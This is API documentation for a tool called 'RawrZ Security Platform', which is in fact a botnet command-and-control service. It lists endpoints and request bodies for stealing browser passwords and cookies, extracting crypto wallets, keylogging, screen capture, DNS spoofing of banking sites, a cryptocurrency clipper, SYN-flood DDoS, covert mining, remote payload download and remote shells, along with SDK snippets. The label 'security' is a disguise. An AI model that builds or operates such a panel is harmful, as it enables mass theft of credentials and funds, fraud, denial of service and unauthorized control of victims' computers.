# RawrZ Security Platform - API Documentation

## Overview

The RawrZ Security Platform provides a comprehensive REST API for managing bot networks, data extraction, and security operations. This documentation covers all available endpoints, request/response formats, and authentication methods.

## Base URL

```
https://your-domain.com/api
```

## Authentication

All API endpoints require authentication using Bearer tokens or API keys.

### Headers

```
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json
```

### API Key Authentication

```
X-API-Key: YOUR_API_KEY
```

## Rate Limiting

- **Standard endpoints**: 100 requests per minute
- **Data extraction endpoints**: 50 requests per minute
- **Bot management endpoints**: 200 requests per minute

## Response Format

All API responses follow this format:

```json
{
  "success": true,
  "data": {},
  "error": null,
  "timestamp": "2024-01-01T00:00:00.000Z",
  "requestId": "uuid"
}
```

## Error Codes

| Code | Description |
|------|-------------|
| 200 | Success |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 429 | Rate Limited |
| 500 | Internal Server Error |

---

## Bot Management API

### Get Bot Network Status

**GET** `/botnet/status`

Returns the current status of the bot network.

**Response:**
```json
{
  "success": true,
  "data": {
    "totalBots": 150,
    "onlineBots": 120,
    "offlineBots": 30,
    "totalLogs": 2500,
    "activeTasks": 15,
    "serverUptime": 86400,
    "lastUpdate": "2024-01-01T00:00:00.000Z"
  }
}
```

### List All Bots

**GET** `/botnet/bots`

Returns a list of all registered bots.

**Query Parameters:**
- `status` (optional): Filter by status (`online`, `offline`)
- `limit` (optional): Number of bots to return (default: 50)
- `offset` (optional): Number of bots to skip (default: 0)

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "bot_12345",
      "ip": "192.168.1.100",
      "os": "Windows 11",
      "status": "online",
      "lastSeen": "2024-01-01T00:00:00.000Z",
      "capabilities": ["data_extraction", "keylogger", "screenshot"],
      "systemInfo": {
        "arch": "x64",
        "version": "10.0.22621",
        "hostname": "DESKTOP-ABC123"
      }
    }
  ]
}
```

### Execute Bot Command

**POST** `/botnet/execute`

Execute a command on one or more bots.

**Request Body:**
```json
{
  "action": "extract_browser_data",
  "target": "bot_12345",
  "params": {
    "browser": "chrome",
    "includePasswords": true
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "commandId": "cmd_67890",
    "action": "extract_browser_data",
    "target": "bot_12345",
    "status": "sent",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

### Get Bot Logs

**GET** `/botnet/logs`

Retrieve logs from bots.

**Query Parameters:**
- `botId` (optional): Filter by specific bot ID
- `action` (optional): Filter by action type
- `limit` (optional): Number of logs to return (default: 100)
- `offset` (optional): Number of logs to skip (default: 0)

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": 1,
      "botId": "bot_12345",
      "action": "extract_browser_data",
      "result": "success",
      "timestamp": "2024-01-01T00:00:00.000Z",
      "details": "Extracted 25 browser entries"
    }
  ]
}
```

---

## Data Extraction API

### Extract Browser Data

**POST** `/data/browser/extract`

Extract browser data from bots.

**Request Body:**
```json
{
  "target": "all",
  "browsers": ["chrome", "firefox", "edge"],
  "includePasswords": true,
  "includeCookies": true,
  "includeHistory": false
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "extractionId": "ext_12345",
    "targets": ["bot_12345", "bot_67890"],
    "status": "in_progress",
    "estimatedTime": 300
  }
}
```

### Extract Cryptocurrency Data

**POST** `/data/crypto/extract`

Extract cryptocurrency wallet data.

**Request Body:**
```json
{
  "target": "bot_12345",
  "wallets": ["metamask", "trust_wallet", "exodus"],
  "includePrivateKeys": false
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "extractionId": "ext_67890",
    "walletsFound": 3,
    "totalValue": "2.5 ETH",
    "status": "completed"
  }
}
```

### Extract System Information

**POST** `/data/system/extract`

Extract system information from bots.

**Request Body:**
```json
{
  "target": "all",
  "includeNetworkInfo": true,
  "includeInstalledSoftware": true,
  "includeRunningProcesses": false
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "extractionId": "ext_11111",
    "systemsScanned": 5,
    "status": "completed",
    "dataSize": "2.3 MB"
  }
}
```

---

## Security Operations API

### Start Keylogger

**POST** `/security/keylogger/start`

Start keylogging on target bots.

**Request Body:**
```json
{
  "target": "bot_12345",
  "duration": 3600,
  "includeScreenshots": true,
  "encryptData": true
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "keyloggerId": "kl_12345",
    "target": "bot_12345",
    "status": "active",
    "startTime": "2024-01-01T00:00:00.000Z"
  }
}
```

### Stop Keylogger

**POST** `/security/keylogger/stop`

Stop keylogging on target bots.

**Request Body:**
```json
{
  "keyloggerId": "kl_12345"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "keyloggerId": "kl_12345",
    "status": "stopped",
    "duration": 3600,
    "dataCollected": "15.2 KB"
  }
}
```

### Take Screenshots

**POST** `/security/screenshot/capture`

Capture screenshots from target bots.

**Request Body:**
```json
{
  "target": "bot_12345",
  "count": 5,
  "interval": 30,
  "quality": "high"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "screenshotId": "ss_12345",
    "target": "bot_12345",
    "count": 5,
    "status": "completed",
    "images": [
      "screenshot_1.png",
      "screenshot_2.png"
    ]
  }
}
```

---

## Network Operations API

### Start DNS Spoofing

**POST** `/network/dns/start`

Start DNS spoofing on target network.

**Request Body:**
```json
{
  "target": "192.168.1.0/24",
  "spoofedDomains": ["bank.com", "paypal.com"],
  "redirectTo": "192.168.1.100"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "dnsId": "dns_12345",
    "target": "192.168.1.0/24",
    "status": "active",
    "domainsSpoofed": 2
  }
}
```

### Start Reverse Proxy

**POST** `/network/proxy/start`

Start reverse proxy server.

**Request Body:**
```json
{
  "localPort": 8080,
  "targetHost": "192.168.1.50",
  "targetPort": 80,
  "ssl": false
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "proxyId": "proxy_12345",
    "localPort": 8080,
    "status": "active",
    "connections": 0
  }
}
```

---

## Advanced Features API

### Start Cryptocurrency Clipper

**POST** `/advanced/clipper/start`

Start cryptocurrency address clipper.

**Request Body:**
```json
{
  "target": "bot_12345",
  "wallets": ["BTC", "ETH", "LTC"],
  "replacementAddresses": {
    "BTC": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "ETH": "0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6"
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "clipperId": "clip_12345",
    "target": "bot_12345",
    "status": "active",
    "walletsMonitored": 3
  }
}
```

### Start DDoS Attack

**POST** `/advanced/ddos/start`

Start DDoS attack on target.

**Request Body:**
```json
{
  "target": "192.168.1.100",
  "method": "TCP_SYN_FLOOD",
  "threads": 50,
  "duration": 300
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "ddosId": "ddos_12345",
    "target": "192.168.1.100",
    "method": "TCP_SYN_FLOOD",
    "status": "active",
    "threads": 50
  }
}
```

### Start Cryptocurrency Mining

**POST** `/advanced/mining/start`

Start cryptocurrency mining on target bots.

**Request Body:**
```json
{
  "target": "bot_12345",
  "algorithm": "RandomX",
  "pool": "pool.minexmr.com:4444",
  "wallet": "4AdUndXHHZ6cFfR8vJQT3hi6W6DmbkQxVCxNtxQADFCg6fGnxM2J2c9HML31gX7ZkdkvWoYeh3zMtdbSr7sHA1xWbU8sW0"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "miningId": "mining_12345",
    "target": "bot_12345",
    "algorithm": "RandomX",
    "status": "active",
    "hashrate": "2.5 KH/s"
  }
}
```

---

## Task Management API

### Create Scheduled Task

**POST** `/tasks/create`

Create a scheduled task.

**Request Body:**
```json
{
  "name": "daily_data_extraction",
  "schedule": "0 2 * * *",
  "command": "extract_browser_data",
  "target": "all",
  "params": {
    "browsers": ["chrome", "firefox"]
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "taskId": "task_12345",
    "name": "daily_data_extraction",
    "schedule": "0 2 * * *",
    "status": "scheduled",
    "nextRun": "2024-01-02T02:00:00.000Z"
  }
}
```

### Schedule Download

**POST** `/tasks/download`

Schedule a file download.

**Request Body:**
```json
{
  "target": "bot_12345",
  "url": "https://example.com/file.exe",
  "destination": "C:\\temp\\",
  "schedule": "immediate"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "downloadId": "dl_12345",
    "target": "bot_12345",
    "url": "https://example.com/file.exe",
    "status": "scheduled"
  }
}
```

---

## Telegram Integration API

### Setup Telegram Bot

**POST** `/telegram/setup`

Setup Telegram bot integration.

**Request Body:**
```json
{
  "botToken": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz",
  "chatId": "-1001234567890",
  "commands": ["/start", "/status", "/info"]
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "telegramId": "tg_12345",
    "botToken": "123456789:ABCdefGHIjklMNOpqrsTUVwxyz",
    "status": "configured",
    "commands": 3
  }
}
```

### Test Telegram Connection

**POST** `/telegram/test`

Test Telegram bot connection.

**Request Body:**
```json
{
  "telegramId": "tg_12345"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "telegramId": "tg_12345",
    "status": "connected",
    "responseTime": "0.5s",
    "messageSent": "Bot is online and responding"
  }
}
```

---

## Remote Shell API

### Open Remote Shell

**POST** `/shell/open`

Open remote shell on target bot.

**Request Body:**
```json
{
  "target": "bot_12345",
  "shellType": "cmd",
  "timeout": 3600
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "shellId": "shell_12345",
    "target": "bot_12345",
    "shellType": "cmd",
    "status": "active",
    "sessionId": "session_67890"
  }
}
```

### Execute Shell Command

**POST** `/shell/execute`

Execute command in remote shell.

**Request Body:**
```json
{
  "shellId": "shell_12345",
  "command": "dir C:\\",
  "timeout": 30
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "shellId": "shell_12345",
    "command": "dir C:\\",
    "output": "Directory of C:\\\n\n01/01/2024  12:00 AM    <DIR>          Program Files\n01/01/2024  12:00 AM    <DIR>          Users\n01/01/2024  12:00 AM    <DIR>          Windows",
    "exitCode": 0,
    "executionTime": 0.5
  }
}
```

---

## Monitoring API

### Get System Statistics

**GET** `/monitoring/stats`

Get system statistics and metrics.

**Response:**
```json
{
  "success": true,
  "data": {
    "system": {
      "uptime": 86400,
      "cpu": 45,
      "memory": 67,
      "disk": 78
    },
    "bots": {
      "total": 150,
      "online": 120,
      "offline": 30
    },
    "network": {
      "connections": 23,
      "inbound": "2.3 MB/s",
      "outbound": "15.7 MB/s"
    },
    "security": {
      "threatLevel": "Low",
      "blockedAttacks": 5,
      "activeThreats": 0
    }
  }
}
```

### Get Dashboard Data

**GET** `/monitoring/dashboard`

Get comprehensive dashboard data.

**Response:**
```json
{
  "success": true,
  "data": {
    "system": {
      "uptime": "1d 0h 0m",
      "cpu": 45,
      "memory": 67
    },
    "bots": {
      "total": 150,
      "online": 120,
      "offline": 30
    },
    "extractions": {
      "total": 2500,
      "browser": 1200,
      "crypto": 300
    },
    "security": {
      "threatLevel": "Low",
      "blockedAttacks": 5,
      "activeThreats": 0
    },
    "network": {
      "connections": 23,
      "inbound": "2.3 MB/s",
      "outbound": "15.7 MB/s"
    },
    "performance": {
      "responseTime": 150
    },
    "activity": [
      {
        "icon": "🤖",
        "title": "Bot connected",
        "time": "2 minutes ago"
      }
    ]
  }
}
```

---

## WebSocket API

### Connection

Connect to WebSocket for real-time updates:

```
wss://your-domain.com/ws
```

### Message Format

```json
{
  "type": "message_type",
  "data": {},
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

### Message Types

- `bot_connected`: New bot connected
- `bot_disconnected`: Bot disconnected
- `command_result`: Command execution result
- `data_extraction`: Data extraction result
- `system_alert`: System alert/notification

---

## Error Handling

### Error Response Format

```json
{
  "success": false,
  "error": {
    "code": "INVALID_TARGET",
    "message": "Target bot not found",
    "details": "Bot ID 'bot_99999' does not exist"
  },
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

### Common Error Codes

- `INVALID_TARGET`: Target bot not found
- `COMMAND_FAILED`: Command execution failed
- `RATE_LIMITED`: Rate limit exceeded
- `AUTHENTICATION_FAILED`: Invalid authentication
- `PERMISSION_DENIED`: Insufficient permissions
- `INVALID_PARAMETERS`: Invalid request parameters

---

## SDKs and Libraries

### JavaScript/Node.js

```javascript
const RawrZClient = require('rawrz-client');

const client = new RawrZClient({
  baseUrl: 'https://your-domain.com/api',
  apiKey: 'your-api-key'
});

// Execute command
const result = await client.botnet.execute({
  action: 'extract_browser_data',
  target: 'bot_12345'
});
```

### Python

```python
from rawrz_client import RawrZClient

client = RawrZClient(
    base_url='https://your-domain.com/api',
    api_key='your-api-key'
)

# Execute command
result = client.botnet.execute({
    'action': 'extract_browser_data',
    'target': 'bot_12345'
})
```

---

## Rate Limiting

Rate limits are enforced per API key and IP address:

- **Standard endpoints**: 100 requests/minute
- **Data extraction**: 50 requests/minute
- **Bot management**: 200 requests/minute

Rate limit headers are included in responses:

```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1640995200
```

---

## Security Considerations

1. **Always use HTTPS** for API communications
2. **Rotate API keys** regularly
3. **Monitor API usage** for suspicious activity
4. **Implement proper authentication** in your applications
5. **Validate all input** before sending requests
6. **Use rate limiting** in your applications
7. **Log all API calls** for audit purposes

---

## Support

For API support and questions:

- **Documentation**: https://docs.rawrz.com
- **Support Email**: support@rawrz.com
- **Discord**: https://discord.gg/rawrz
- **GitHub**: https://github.com/rawrz/security-platform

---

## Changelog

### Version 2.0.0 (2024-01-01)
- Added mobile bot support
- Enhanced security features
- Improved monitoring dashboard
- Added advanced evasion techniques

### Version 1.5.0 (2023-12-01)
- Added Telegram integration
- Enhanced data extraction
- Improved WebSocket support
- Added backup system

### Version 1.0.0 (2023-11-01)
- Initial release
- Basic bot management
- Core data extraction
- WebSocket communication
